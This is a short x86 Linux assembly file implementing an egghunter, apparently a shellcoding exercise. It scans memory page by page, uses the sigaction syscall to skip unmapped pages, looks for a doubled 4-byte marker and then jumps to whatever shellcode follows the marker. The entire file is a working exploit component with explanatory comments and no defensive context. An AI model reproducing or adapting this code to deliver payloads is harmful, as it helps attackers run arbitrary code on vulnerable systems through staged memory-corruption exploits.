global _start

section .text
_start:

next_page:

	or cx,0xfff            ; set cx to 4095

next_address:

	inc ecx			; increment to 4096	
	push byte +0x43         ; sigaction()
	pop eax                 ; put syscall in eax
	int 0x80                ; execute sigaction()
	cmp al,0xf2             ; check for EFAULT
	jz next_page            ; if EFAULT jump to next page in memory
	mov eax, 0x50905090     ; move EGG in EAX
	mov edi, ecx            ; move address to be checked by scasd
	scasd                   ; is eax == edi? if so edi is incremented by 4 bytes
	jnz next_address        ; if not try with the next address
	scasd                   ; check for second half of EGG
	jnz next_address        ; if not try with next address
	jmp edi                 ; if EGG is found, jmp to shellcode
	
